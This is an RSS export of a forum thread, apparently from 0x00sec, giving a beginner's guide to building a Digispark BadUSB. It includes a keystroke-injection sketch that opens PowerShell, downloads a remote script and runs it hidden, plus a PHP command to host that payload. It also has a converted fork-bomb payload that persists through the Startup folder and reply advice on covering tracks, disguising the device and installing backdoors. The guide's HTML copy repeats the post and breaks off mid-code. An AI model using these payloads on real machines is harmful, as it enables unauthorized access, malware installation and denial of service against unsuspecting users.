@@ -1,0 +1,624 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>A Complete Beginner Friendly Guide To The Digispark BadUSB</title>
+    <link>https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002</link>
+    <description>The thesis I presented for my diploma was about physical security, with BadUSB devices taking the most amount of pages. I saw there&#39;s already a pretty good post on how to make your own BadUSB starting from a vulnerable stick ([click](https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159)) but I&#39;d like to make another contribution in the same subject by presenting a complete guide on how to use a very cheap programmable microcontroller board for the same purpose: the Digispark from Digistump.
+
+This guide is &quot;complete&quot; because it will cover installation of the needed programs and drivers, include an explanation of what a BadUSB is and how it works, how to write our own scripts, and finally how to convert Rubber Ducky scripts for our little Digispark. I hope you&#39;ll find this thread interesting and perhaps even insightful.
+
+**1. What does &quot;BadUSB&quot; mean?**
+
+We use the term _BadUSB_ to describe any USB device of any type that was programmed (or _reprogrammed_ in case of a vulnerable device being flashed) specifically to emulate a keyboard by sending a predetermined sequence of key press events to a computer in order to complete a task, which typically has the objective of gathering/stealing information, opening a backdoor on the victim machine, installing malware, or any imaginable action that can be achieved through use of the keyboard. This works thanks to the existence of a class of USB devices called HID, Human Interface Devices, a class including devices we use on a daily basis, such as gaming controllers, mouses, and of course, keyboards. A BadUSB works by identifying itself as a keyboard to the computer when connected, so the operating system will interpret the data sent by the device as key presses.
+
+As you can easily guess from the possible uses of these devices they can be a very helpful resource to any security professional, so they gained quite some attention in little time, and as a result several ad-hoc easily programmable BadUSB sticks were released, such as the [Malduino](https://malduino.com/) or the most popular model of all, the [Rubber Ducky](https://hakshop.com/products/usb-rubber-ducky-deluxe). These devices can be very helpful for sure, but their price can seem a little high when compared to the alternative of creating one yourself with just a little microcontroller board, so I highly recommend this route instead if you&#39;re interested in playing around with a BadUSB, because even if we&#39;ll have to tinker with more programs and settings in order to make everything work it will all be worth it in the end.
+
+In fact, the board of my choice is the [Digistump Digispark](http://digistump.com/products/1), a very small programmable board based on the Attiny85 controller, it costs around $8 on the official website, but you can find it for even cheaper on eBay or from the website of other vendors, I got my three models in a single bundle which cost me $7, while a Rubber Ducky alone can cost $45, and I&#39;ll be honest, I have more fun doing things myself instead of buying something that is already ready to use, where&#39;s the fun and satisfaction in using that? But that&#39;s just personal taste.
+
+**2. I have my Digispark, how do I use it?**
+
+Okay, now we have our board, let&#39;s go through the steps we need to follow to prepare all the programs needed to program it. First of all we need to download the Arduino IDE from [this](https://www.arduino.cc/en/Main/Software) link, install it, and open it. Once the IDE is ready, go to File &gt; Preferences, this window will open:
+
+![0x00sec1|594x500](upload://gPNFytoB5zVa6hMQYn3zOcFUSGx.png)
+
+You&#39;ll have to paste the URL you see below in the highlighted textbox, if you have already added another URL in the textbox you can separate them with a semicolon.
+
+    http://digistump.com/package_digistump_index.json
+
+This URL will tell our IDE where to look for the packages and plug-ins related to our board, in our case, it will point to all products made by Digistump. Click OK and go to Tools &gt; Board: &gt; Board Manager, a window will open, you can type Digispark in the textbox on the top right and click on the only result called &quot;Digistump AVR Boards&quot;, an &quot;Install&quot; button will appear, and clicking on it will download and install the packages we need to program the Digispark from our handy IDE:
+
+![0x00sec1|690x166](upload://us9rD2GDBBdA3QeiJfYZNC19zjB.png)
+
+After the packages  are ready you can close the window and select your Digispark model by selecting it from the Tools &gt; Board menu, the first option of the Digistump family is the one you&#39;ll most likely have in your hands now:
+
+![0x00sec1|674x494](upload://xW4DFViVxitbXCBRFNvCKozj5T3.png)
+
+Be careful, always double check the board type before loading any script on your board or you might brick it! Now it&#39;s time to download the drivers of the board so that Windows recognizes it, without these drivers the board will appear as an unknown device. [This](https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip) is a direct link to the latest version of the drivers, unzip the folder inside the archive and open one of these two executables to install the 32 or 64 bits version of the drivers:
+
+![0x00sec1|690x169](upload://4rguuf7pCnb4yEx5BhcFcqIlY3s.png)
+
+Now for the final step, open the Windows Device Manager. Connect your board to the computer, you&#39;ll see a new &quot;Unknown Device&quot; being added to the list of devices, but then it will disappear after a couple seconds. That was our board, click on View &gt; View Hidden Devices to make it reappear, you&#39;ll probably see it under the &quot;Other Devices&quot; category, now you can right-click on it, then choose &quot;Update driver software&quot; &gt; &quot;Browse my computer for driver software&quot;, and point the textbox to the folder where you previously extracted the drivers, and make sure the &quot;Include subfolders&quot; checkbox is set. After this, you can click on Next and after a few seconds our board will be fully installed on our computer and ready to use.
+
+Notice that when you connect it to the computer it will still disappear after a few seconds, this because the board activates some of its PINs to transmit data through the USB port to communicate with a board programmer, it won&#39;t find one running so the board will switch mode and start using those same PINs to run the software it has loaded in memory, so the device will disconnect from the computer and stop communicating, using the computer exclusively as a power supply. This is perfectly normal.
+
+To test if everything works as expected, unplug the board and load one of the examples for the Digispark, click on Compile and after a quick error check it will ask you to connect the board, do so and the program will be loaded in memory, if you followed all steps correctly the program should start running immediately, use a simple LED blink example and it should work fine. Now we can start talking about serious business.
+
+**3. The Digispark board as a BadUSB**
+
+Before showing you a nice list of ready scripts I would like to talk about how they work, so that you have a good understanding of what&#39;s going on under the hood once you plug your BadUSB. Let&#39;s take the &quot;Execute PowerShell Script&quot; example written by CedArctic (link to the GitHub below) and let&#39;s examine it a bit, understanding how this one script works means understanding all of them:
+
+    // this library allows the board to be recognized as a keyboard
+    #include &quot;DigiKeyboard.h&quot;
+
+    void setup() 
+    {
+         // we don&#39;t need to initialize anything in this example so the setup()  function remains empty
+    }
+    
+    void loop() 
+    {
+        // calling the sendKeyStroke() function with 0 starts the script, it cancels the effect of all keys that are already being pressed at the time of execution to avoid conflicts
+        DigiKeyboard.sendKeyStroke(0);
+
+        // waits half a second (500 ms) before sending any other key strokes
+        DigiKeyboard.delay(500);
+
+        // presses &lt;WINDOWS&gt; + R to open run.exe and waits another half second for it to start
+        DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+        DigiKeyboard.delay(500);
+
+        // writes &quot;powershell&quot; in the textbox of run.exe and presses ENTER to open it
+        DigiKeyboard.print(&quot;powershell&quot;);
+        DigiKeyboard.sendKeyStroke(KEY_ENTER);
+        DigiKeyboard.delay(500);
+
+        // now we are on PowerShell, so the code declares a WebClient object to download our malicious script
+        DigiKeyboard.print(&quot;$client = new-object System.Net.WebClient&quot;);
+        DigiKeyboard.sendKeyStroke(KEY_ENTER);
+        DigiKeyboard.delay(500);
+
+        // downloads the script from &quot;scriptURL&quot; as &quot;script.ps1&quot;
+        DigiKeyboard.print(&quot;$client.DownloadFile(\&quot;https://scriptURL\&quot; , \&quot;script.ps1\&quot;)&quot;);
+        DigiKeyboard.delay(1000);
+
+        // opens a new run.exe instance
+        DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
+        DigiKeyboard.delay(750);
+
+        // runs the downloaded script in hidden mode
+        DigiKeyboard.print(&quot;powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1&quot;);
+        DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+        for (;;)
+        {
+            // empty infinite loop
+        }
+
+    }
+
+It&#39;s not too complicated, isn&#39;t it? If you understand the code above you&#39;ll be able to write your own scripts very easily, it&#39;s also worth noticing how the empty loop at the end is optional, you could replace it with a loop like this to make the integrated LED blink once the script has stopped executing:
+
+    while (true)
+    {
+        digitalWrite(0, HIGH);
+        delay(300);
+        digitalWrite(0, LOW);
+        delay(300);
+    }
+
+And to clear one detail up, yes, in the example above you need a direct link to your script somewhere, if you happen to be in the same LAN as the victim or if you have a VPS or a computer that can be reached over WAN with its own IP then you can use PHP like so:
+
+    mkdir digispark_remote
+    mv my_ps_script.ps1 digispark_remote/my_ps_script.ps1
+    sudo php -S 0.0.0.0:&lt;port&gt; -t digispark_remote
+
+We use _-S 0.0.0.0_ to enable a server on all network interfaces and we can choose any port we like, also we set the main directory of our temporary server as digispark_remote with the -t parameter. Our console will notify us when someone downloads the script so we&#39;ll know when the script has been executed:
+
+![0x00sec1|690x226](upload://xkCEHsvtuNamZF6jVRFnWMdRdx3.jpg)
+(old screenshot taken directly from my thesis because I&#39;m too lazy to repeat the whole thing)
+
+If you fancy any more pre-made scripts to study from or to use straight away CedArctic wrote some very interesting ones and you can find them [here](https://github.com/CedArctic/DigiSpark-Scripts).
+
+**4. Can I use Rubber Ducky scripts on my Digispark?**
+
+Not natively, but CedArctic comes to our rescue once again with his beautiful [digiQuack](https://github.com/CedArctic/digiQuack), a tool that converts scripts written in Ducky Script into scripts we can load on the Digispark. Alternatively, you can use toxydose&#39;s [Duckyspark](https://github.com/toxydose/Duckyspark), which does the same thing, but digiQuack supports foreign keyboard layouts (foreign layouts won&#39;t work with scripts written for the standard US layout!) and optimises the code for the Attiny85 so that it works faster and it doesn&#39;t eats up too much space in EEPROM.
+
+For example, let&#39;s take the Fork Bomb script we can find in [this great repository of Rubber Ducky payloads](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads):
+
+    CONTROL ESCAPE
+    DELAY 200
+    STRING cmd
+    DELAY 200
+    MENU
+    DELAY 100
+    STRING a
+    ENTER
+    DELAY 200
+    LEFT
+    ENTER
+    DELAY 1000
+    STRING cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
+    ENTER
+    STRING copy con a.bat
+    ENTER
+    STRING @echo off
+    ENTER
+    STRING :START
+    ENTER
+    STRING start a.bat 
+    ENTER
+    STRING GOTO START
+    ENTER
+    CONTROL z
+    ENTER
+    STRING a.bat
+    ENTER
+    ALT F4
+
+And let&#39;s convert it using both programs: to use Duckyspark we need to type:
+
+    python duckyspark_translator.py ducky_script.txt output_file
+
+output_file will be created as a .ino file and this is the output we get by feeding it the Fork Bomb script:
+
+    //generated by Duckyspark https://github.com/toxydose/Duckyspark
+
+    #include &quot;DigiKeyboard.h&quot;
+    #define KEY_ESC     41
+    #define KEY_BACKSPACE 42
+    #define KEY_TAB     43
+    #define KEY_PRT_SCR 70
+    #define KEY_DELETE  76
+    #define KEY_ARROW_RIGHT 0x4F
+    #define KEY_ARROW_DOWN  0x51
+    #define KEY_ARROW_UP    0x52
+
+    void setup()
+    {
+
+        DigiKeyboard.delay(5000);
+        DigiKeyboard.sendKeyStroke(0);
+        DigiKeyboard.sendKeyStroke(KEY_ESC,MOD_CONTROL_LEFT | 0);
+        DigiKeyboard.delay(200);
+        DigiKeyboard.print(F(&quot;cmd&quot;));
+        DigiKeyboard.delay(200);
+        DigiKeyboard.sendKeyStroke(KEY_F10,MOD_SHIFT_LEFT);
+        DigiKeyboard.delay(100);
+        DigiKeyboard.print(F(&quot;a&quot;));
+        DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+        DigiKeyboard.delay(200);
+        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT,0);
+        DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+        DigiKeyboard.delay(1000);
+        DigiKeyboard.print(F(&quot;cd %ProgramData%&quot;)); DigiKeyboard.print(char(92));                 
+        DigiKeyboard.print(F(&quot;Microsoft&quot;)); DigiKeyboard.print(char(92)); DigiKeyboard.print(F(&quot;Windows&quot;)); 
+        DigiKeyboard.print(char(92)); DigiKeyboard.print(F(&quot;Start Menu&quot;)); DigiKeyboard.print(char(92)); 
+        DigiKeyboard.print(F(&quot;Programs&quot;)); DigiKeyboard.print(char(92)); DigiKeyboard.print(F(&quot;Startup&quot;)); 
+        DigiKeyboard.print(char(92)); DigiKeyboard.print(F(&quot;&quot;));
+        DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+        DigiKeyboard.print(F(&quot;copy con a.bat&quot;));
+        DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+        DigiKeyboard.print(F(&quot;@echo off&quot;));
+        DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+        DigiKeyboard.print(F(&quot;:START&quot;));
+        DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+        DigiKeyboard.print(F(&quot;start a.bat &quot;));
+        DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+        DigiKeyboard.print(F(&quot;GOTO START&quot;));
+        DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+        DigiKeyboard.sendKeyStroke(KEY_Z,MOD_CONTROL_LEFT | 0);
+        DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+        DigiKeyboard.print(F(&quot;a.bat&quot;));
+        DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+        DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT | 0);
+
+    }
+
+
+    void loop()
+    {
+
+    }
+
+We can observe immediately the different approach used by this program: incapsulating the entire payload inside the setup() function to make it execute only once instead of putting it into loop() like we did, in fact, the setup() function in an Arduino sketch contains the very first instructions to be executed by the controller, while loop() is called as soon as setup() finishes its course, and usually contains the actual body of the program, which, as the name suggests, is executed in an infinite loop. We can also see how at some point the program made a little mess when dealing with the string &quot;cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\&quot;, it&#39;s a little odd, but it should still work.
+
+Our last test is going to be using digiQuack to convert the same payload, we can run digiQuack from our terminal (it has a different version for each OS, written in C++ instead of python) and it will ask us to input the path of our Rubber Ducky payload, then it will ask whether we want the payload to be executed once or in an infinite loop, so we answer just once and the program will create a file called converted.txt in the same folder of the executable, here&#39;s its content:
+
+    DigiKeyboard.sendKeyStroke(0);
+    DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,41);
+    DigiKeyboard.delay(200);
+    DigiKeyboard.print(F(&quot;cmd&quot;));
+    DigiKeyboard.delay(200);
+    DigiKeyboard.sendKeyStroke(101);
+    DigiKeyboard.delay(100);
+    DigiKeyboard.print(F(&quot;a&quot;));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(200);
+    DigiKeyboard.sendKeyStroke(80);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(1000);
+    DigiKeyboard.print(F(&quot;cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\&quot;));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print(F(&quot;copy con a.bat&quot;));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print(F(&quot;@echo off&quot;));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print(F(&quot;:START&quot;));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print(F(&quot;start a.bat &quot;));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print(F(&quot;GOTO START&quot;));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_Z);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print(F(&quot;a.bat&quot;));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_F4);
+    for(;;){ /*empty*/ }
+
+As we can see it&#39;s a more compact and slightly more elegant code, it doesn&#39;t contain any functions so it means we can wrap these lines of code inside either setup() or loop(), it&#39;s our own choice, let&#39;s just remember to include DigiKeyboard.h at the beginning of the file before compiling it.
+
+**5. Conclusions**
+
+And this is all I had to say for today, aside from the fact that if you wish to write scripts for other keyboard layouts you will have to edit the hardcoded numbers contained in DigiKeyboard.h to match the values of your desired layout, you can find the tables you need in [this massive document about HID](http://www.usb.org/developers/hidpage/Hut1_12v2.pdf), while [here](https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h) you can find the source code of said library if you want to take a look at how it works.
+
+Thank you for reading this far, I&#39;m always available to correct any errors and answer questions if there are any.
+
+Rubber Ducky scripts: [here](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads)
+Digispark scripts: [here](https://github.com/CedArctic/DigiSpark-Scripts)</description>
+    
+    <lastBuildDate>Mon, 13 Aug 2018 14:24:49 +0000</lastBuildDate>
+    <category>Hardware</category>
+    <atom:link href="https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>A Complete Beginner Friendly Guide To The Digispark BadUSB</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002/4</link>
+        <pubDate>Tue, 11 Sep 2018 23:49:40 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-8002-4</guid>
+        <source url="https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002.rss">A Complete Beginner Friendly Guide To The Digispark BadUSB</source>
+      </item>
+      <item>
+        <title>A Complete Beginner Friendly Guide To The Digispark BadUSB</title>
+        <dc:creator><![CDATA[Baud]]></dc:creator>
+        <description><![CDATA[
+            <p>Yes, it is indeed possible to make the script faster by reducing the milliseconds inside each <em>delay(n)</em> call, but it might be a little risky: the reason why you see higher values more often than not is because this way the script is most likely going to work even on slower computers or computers with a lot of processes already in execution, since the script itself can’t know exactly when the program we want to open will be available, or when the string we want to write has all been printed, a higher delay allows us to be at least 95% sure each operation is performed correctly.</p>
+<p>Alternatively you could try playing around with DigiKeyboard.h to change the speed at which one key press is sent after the other, it’s very simple:</p>
+<pre><code>void sendKeyStroke(byte keyStroke, byte modifiers) 
+{
+    while (!usbInterruptIsReady()) 
+    {
+        usbPoll();
+        _delay_ms(5);
+    }
+
+    memset(reportBuffer, 0, sizeof(reportBuffer));
+	
+    reportBuffer[0] = modifiers;
+    reportBuffer[1] = keyStroke;
+
+    usbSetInterrupt(reportBuffer, sizeof(reportBuffer));
+	
+    while (!usbInterruptIsReady())
+    {
+	    usbPoll();
+	    _delay_ms(5);
+    }
+  
+    memset(reportBuffer, 0, sizeof(reportBuffer));      
+    usbSetInterrupt(reportBuffer, sizeof(reportBuffer));
+}
+</code></pre>
+<p>This is the function contained in the library that prints each character. You can see each keystroke is sent after a short pause of 5 milliseconds, change all those _<em>delay_ms(5)</em> calls and you should notice a very small improvement in string printing speed, at least if the strings you wish to print are long.</p>
+<p>There isn’t anything else you can do to make it faster, BadUSBs are typically used by the owner instead of being dropped somewhere random in the hope that someone picks it up, so most of the times all you need for a successful attack is 5 to 10 seconds of physical access to a machine while nobody is watching, if you include a bunch of Alt + F4 key presses in your script then you’ll also be able to close each window you opened to cover your tracks as much as possible.</p>
+<p>If you want to make the Digispark look a little less fishy you can make it a little shield with a 3D printer, many people published their own projects but these two are the best ones in my opinion:</p>
+<p></p><aside class="onebox allowlistedgeneric">
+  <header class="source">
+      <img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cf00775876c8ee5ef223703a357e98f4eb8ff5ac.png" class="site-icon" width="" height="">
+      <a href="https://www.thingiverse.com/thing:2492062" target="_blank" rel="noopener nofollow ugc">thingiverse.com</a>
+  </header>
+  <article class="onebox-body">
+    <img src="//0x00sec.s3.amazonaws.com/original/2X/9/9d73be23d44dddd85bdd54d0cc638ebfc8ff2b36.jpg" class="thumbnail" width="" height="">
+
+<h3><a href="https://www.thingiverse.com/thing:2492062" target="_blank" rel="noopener nofollow ugc">DigiSpark USB-Stick by Hedelinoo</a></h3>
+
+<p>This is a very simple, but elegant case for the Digispark. I hope you like it!</p>
+
+
+  </article>
+  <div class="onebox-metadata">
+    
+    
+  </div>
+  <div style="clear: both"></div>
+</aside>
+<br>
+<aside class="onebox allowlistedgeneric">
+  <header class="source">
+      <img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cf00775876c8ee5ef223703a357e98f4eb8ff5ac.png" class="site-icon" width="" height="">
+      <a href="https://www.thingiverse.com/thing:2347216" target="_blank" rel="noopener nofollow ugc">thingiverse.com</a>
+  </header>
+  <article class="onebox-body">
+    <img src="//0x00sec.s3.amazonaws.com/original/2X/1/13d737be6469bbf0ad1adbfba857ce339f428101.JPG" class="thumbnail" width="" height="">
+
+<h3><a href="https://www.thingiverse.com/thing:2347216" target="_blank" rel="noopener nofollow ugc">Digispark attiny85 BadUsb fake usb memory case by Prospect3dlab</a></h3>
+
+<p>https://www.youtube.com/watch?v=fGmGBa-4cYQ
+In this video Seytonic explain how you can use DigiSpark as 1$ usb virtual keyboard for doing all sorts of stuff. I designed and tried this case which make ordinary DigiSpark to look like full size USB...</p>
+
+
+  </article>
+  <div class="onebox-metadata">
+    
+    
+  </div>
+  <div style="clear: both"></div>
+</aside>
+<p></p>
+<p>And finally no, you cannot install a file system on the controller. If you want to mount a file system at the end of the script you’d need to create a more complex project that includes a legit USB stick too, which should be mounted from command line to a path of your choice (like E:) so that now you can refer to E:\ in your script to copy files from your target into your stick, but it has to be a separate device and automating this mounting process is most likely going to be very tricky. You’ll have more success installing a backdoor and gaining complete control over the machine remotely.</p>
+          <p><a href="https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002/3</link>
+        <pubDate>Mon, 13 Aug 2018 14:24:49 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-8002-3</guid>
+        <source url="https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002.rss">A Complete Beginner Friendly Guide To The Digispark BadUSB</source>
+      </item>
+      <item>
+        <title>A Complete Beginner Friendly Guide To The Digispark BadUSB</title>
+        <dc:creator><![CDATA[Rot127]]></dc:creator>
+        <description><![CDATA[
+            <p>Nice read! Thanks!<br>
+I know that this is basically just a PoC but is there any possibility to make these keystrokes quicker (and the BadUSB more stealthier)?<br>
+I am curious how you have to design/set-up the micro controller, if you want a BadUSB which lies somewhere around and is picked up by a random person.<br>
+Waiting regularly half a second means that the Power Shell will be visible for ~2 or more seconds which could alarm the victim. Or am I wrong?<br>
+Oh, and is it possible to install a file system on the micro controller, which will be served after the keystrokes are done?</p>
+          <p><a href="https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002/2</link>
+        <pubDate>Mon, 13 Aug 2018 11:23:25 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-8002-2</guid>
+        <source url="https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002.rss">A Complete Beginner Friendly Guide To The Digispark BadUSB</source>
+      </item>
+      <item>
+        <title>A Complete Beginner Friendly Guide To The Digispark BadUSB</title>
+        <dc:creator><![CDATA[Baud]]></dc:creator>
+        <description><![CDATA[
+            <p>The thesis I presented for my diploma was about physical security, with BadUSB devices taking the most amount of pages. I saw there’s already a pretty good post on how to make your own BadUSB starting from a vulnerable stick (<a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159">click</a>) but I’d like to make another contribution in the same subject by presenting a complete guide on how to use a very cheap programmable microcontroller board for the same purpose: the Digispark from Digistump.</p>
+<p>This guide is “complete” because it will cover installation of the needed programs and drivers, include an explanation of what a BadUSB is and how it works, how to write our own scripts, and finally how to convert Rubber Ducky scripts for our little Digispark. I hope you’ll find this thread interesting and perhaps even insightful.</p>
+<p><strong>1. What does “BadUSB” mean?</strong></p>
+<p>We use the term <em>BadUSB</em> to describe any USB device of any type that was programmed (or <em>reprogrammed</em> in case of a vulnerable device being flashed) specifically to emulate a keyboard by sending a predetermined sequence of key press events to a computer in order to complete a task, which typically has the objective of gathering/stealing information, opening a backdoor on the victim machine, installing malware, or any imaginable action that can be achieved through use of the keyboard. This works thanks to the existence of a class of USB devices called HID, Human Interface Devices, a class including devices we use on a daily basis, such as gaming controllers, mouses, and of course, keyboards. A BadUSB works by identifying itself as a keyboard to the computer when connected, so the operating system will interpret the data sent by the device as key presses.</p>
+<p>As you can easily guess from the possible uses of these devices they can be a very helpful resource to any security professional, so they gained quite some attention in little time, and as a result several ad-hoc easily programmable BadUSB sticks were released, such as the <a href="https://malduino.com/" rel="noopener nofollow ugc">Malduino</a> or the most popular model of all, the <a href="https://hakshop.com/products/usb-rubber-ducky-deluxe" rel="noopener nofollow ugc">Rubber Ducky</a>. These devices can be very helpful for sure, but their price can seem a little high when compared to the alternative of creating one yourself with just a little microcontroller board, so I highly recommend this route instead if you’re interested in playing around with a BadUSB, because even if we’ll have to tinker with more programs and settings in order to make everything work it will all be worth it in the end.</p>
+<p>In fact, the board of my choice is the <a href="http://digistump.com/products/1" rel="noopener nofollow ugc">Digistump Digispark</a>, a very small programmable board based on the Attiny85 controller, it costs around $8 on the official website, but you can find it for even cheaper on eBay or from the website of other vendors, I got my three models in a single bundle which cost me $7, while a Rubber Ducky alone can cost $45, and I’ll be honest, I have more fun doing things myself instead of buying something that is already ready to use, where’s the fun and satisfaction in using that? But that’s just personal taste.</p>
+<p><strong>2. I have my Digispark, how do I use it?</strong></p>
+<p>Okay, now we have our board, let’s go through the steps we need to follow to prepare all the programs needed to program it. First of all we need to download the Arduino IDE from <a href="https://www.arduino.cc/en/Main/Software" rel="noopener nofollow ugc">this</a> link, install it, and open it. Once the IDE is ready, go to File &gt; Preferences, this window will open:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/75fdd1d85fd237318798b04729b2027b93c63475.png" alt="0x00sec1" data-base62-sha1="gPNFytoB5zVa6hMQYn3zOcFUSGx" width="594" height="500"></p>
+<p>You’ll have to paste the URL you see below in the highlighted textbox, if you have already added another URL in the textbox you can separate them with a semicolon.</p>
+<pre><code>http://digistump.com/package_digistump_index.json
+</code></pre>
+<p>This URL will tell our IDE where to look for the packages and plug-ins related to our board, in our case, it will point to all products made by Digistump. Click OK and go to Tools &gt; Board: &gt; Board Manager, a window will open, you can type Digispark in the textbox on the top right and click on the only result called “Digistump AVR Boards”, an “Install” button will appear, and clicking on it will download and install the packages we need to program the Digispark from our handy IDE:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/d/d56fe66000c7d5e4c9be472a1c64bfaa0bcac813.png" alt="0x00sec1" data-base62-sha1="us9rD2GDBBdA3QeiJfYZNC19zjB" width="690" height="166"></p>
+<p>After the packages  are ready you can close the window and select your Digispark model by selecting it from the Tools &gt; Board menu, the first option of the Digistump family is the one you’ll most likely have in your hands now:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/edd853d451ad64573fa5eba3f21e61360b047981.png" alt="0x00sec1" data-base62-sha1="xW4DFViVxitbXCBRFNvCKozj5T3" width="674" height="494"></p>
+<p>Be careful, always double check the board type before loading any script on your board or you might brick it! Now it’s time to download the drivers of the board so that Windows recognizes it, without these drivers the board will appear as an unknown device. <a href="https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip" rel="noopener nofollow ugc">This</a> is a direct link to the latest version of the drivers, unzip the folder inside the archive and open one of these two executables to install the 32 or 64 bits version of the drivers:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/1/1f1dba276954a8e312a2d5248bad5059f2eb501e.png" alt="0x00sec1" data-base62-sha1="4rguuf7pCnb4yEx5BhcFcqIlY3s" width="690" height="169"></p>
+<p>Now for the final step, open the Windows Device Manager. Connect your board to the computer, you’ll see a new “Unknown Device” being added to the list of devices, but then it will disappear after a couple seconds. That was our board, click on View &gt; View Hidden Devices to make it reappear, you’ll probably see it under the “Other Devices” category, now you can right-click on it, then choose “Update driver software” &gt; “Browse my computer for driver software”, and point the textbox to the folder where you previously extracted the drivers, and make sure the “Include subfolders” checkbox is set. After this, you can click on Next and after a few seconds our board will be fully installed on our computer and ready to use.</p>
+<p>Notice that when you connect it to the computer it will still disappear after a few seconds, this because the board activates some of its PINs to transmit data through the USB port to communicate with a board programmer, it won’t find one running so the board will switch mode and start using those same PINs to run the software it has loaded in memory, so the device will disconnect from the computer and stop communicating, using the computer exclusively as a power supply. This is perfectly normal.</p>
+<p>To test if everything works as expected, unplug the board and load one of the examples for the Digispark, click on Compile and after a quick error check it will ask you to connect the board, do so and the program will be loaded in memory, if you followed all steps correctly the program should start running immediately, use a simple LED blink example and it should work fine. Now we can start talking about serious business.</p>
+<p><strong>3. The Digispark board as a BadUSB</strong></p>
+<p>Before showing you a nice list of ready scripts I would like to talk about how they work, so that you have a good understanding of what’s going on under the hood once you plug your BadUSB. Let’s take the “Execute PowerShell Script” example written by CedArctic (link to the GitHub below) and let’s examine it a bit, understanding how this one script works means understanding all of them:</p>
+<pre><code>// this library allows the board to be recognized as a keyboard
+#include "DigiKeyboard.h"
+
+void setup() 
+{
+     // we don't need to initialize anything in this example so the setup()  function remains empty
+}
+
+void loop() 
+{
+    // calling the sendKeyStroke() function with 0 starts the script, it cancels the effect of all keys that are already being pressed at the time of execution to avoid conflicts
+    DigiKeyboard.sendKeyStroke(0);
+
+    // waits half a second (500 ms) before sending any other key strokes
+    DigiKeyboard.delay(500);
+
+    // presses &lt;WINDOWS&gt; + R to open run.exe and waits another half second for it to start
+    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+    DigiKeyboard.delay(500);
+
+    // writes "powershell" in the textbox of run.exe and presses ENTER to open it
